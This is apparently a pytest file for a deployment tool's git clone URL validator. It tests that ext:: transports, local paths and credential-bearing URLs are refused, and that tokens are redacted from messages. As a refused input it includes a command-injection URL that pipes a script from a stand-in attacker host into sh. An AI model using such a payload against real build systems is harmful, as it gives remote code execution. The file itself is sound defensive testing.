"""Which clone URLs are allowed."""

from __future__ import annotations

import pytest

from deploypro.domain.errors import InvalidRequest
from deploypro.domain.repo_url import validate_repo_url


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/owner/repo.git",
        "http://git.internal/repo.git",
        "ssh://git@github.com/owner/repo.git",
        "git@github.com:owner/repo.git",
    ],
)
def test_ordinary_urls_are_accepted(url):
    assert validate_repo_url(f"  {url} ") == url


def test_the_ext_transport_is_refused():
    """`git clone 'ext::sh -c ...'` runs the command. An allowlist of
    transports is the difference between a clone and a shell on the build
    host."""
    with pytest.raises(InvalidRequest):
        validate_repo_url("ext::sh -c 'curl evil.example/x.sh | sh'")


@pytest.mark.parametrize(
    "url", ["file:///etc/passwd", "/srv/repos/thing.git", "ftp://x/y", ""]
)
def test_other_transports_and_local_paths_are_refused(url):
    with pytest.raises(InvalidRequest):
        validate_repo_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "https://ghp_abc123@github.com/owner/repo.git",
        "https://x-access-token:ghs_secret@github.com/owner/repo.git",
        "https://user:hunter2@git.example.com/repo.git",
    ],
)
def test_a_credential_in_the_url_is_refused(url):
    """Stored, it would be plain text in the database, every deploy log and
    the dashboard. The refusal points at deploy keys instead."""
    with pytest.raises(InvalidRequest) as refused:
        validate_repo_url(url)
    assert "deploy key" in refused.value.message
    for secret in ("ghp_abc123", "ghs_secret", "hunter2"):
        assert secret not in refused.value.message


def test_a_refused_url_never_echoes_its_credential():
    """An upper-case scheme is refused as unsupported before the credential
    check — and that message, too, must not repeat the token."""
    with pytest.raises(InvalidRequest) as refused:
        validate_repo_url("HTTPS://ghp_TOKEN@github.com/owner/repo.git")
    assert "ghp_TOKEN" not in refused.value.message


class TestSshUrl:
    @pytest.mark.parametrize(
        "url",
        [
            "git@github.com:owner/repo.git",
            "ssh://git@github.com/owner/repo.git",
            "ssh://git@127.0.0.1:2222/srv/app.git",
            "deploy@git.example.com:team/app.git",
        ],
    )
    def test_ssh_forms_are_recognised(self, url):
        from deploypro.domain.repo_url import is_ssh_url

        assert is_ssh_url(url)

    @pytest.mark.parametrize(
        "url", ["https://github.com/owner/repo.git", "http://git.internal/repo.git"]
    )
    def test_http_is_not(self, url):
        from deploypro.domain.repo_url import is_ssh_url

        assert not is_ssh_url(url)


class TestRedact:
    def test_blanks_credentials_wherever_a_url_appears(self):
        from deploypro.domain.repo_url import redact

        text = (
            "fatal: unable to access "
            "'https://x-access-token:ghs_abc@github.com/o/r.git/': "
            "The requested URL returned error: 403"
        )
        assert "ghs_abc" not in redact(text)
        assert "https://***@github.com/o/r.git" in redact(text)

    def test_leaves_urls_without_credentials_and_ssh_users_alone(self):
        from deploypro.domain.repo_url import redact

        text = "cloning https://github.com/o/r.git and git@github.com:o/r.git"
        assert redact(text) == text


def test_the_pinned_github_keys_are_the_published_ones():
    """Fingerprints from docs.github.com, "GitHub's SSH key fingerprints".
    A single wrong character in a pinned key changes its fingerprint."""
    import base64
    import hashlib

    from deploypro.domain.repo_url import GITHUB_KNOWN_HOSTS

    fingerprints = set()
    for line in GITHUB_KNOWN_HOSTS:
        blob = base64.b64decode(line.split()[2])
        digest = base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")
        fingerprints.add(f"SHA256:{digest}")
    assert fingerprints == {
        "SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU",
        "SHA256:p2QAMXNIC1TJYWeIOttrVc98/R1BUFWu3/LiyKgUfQM",
    }
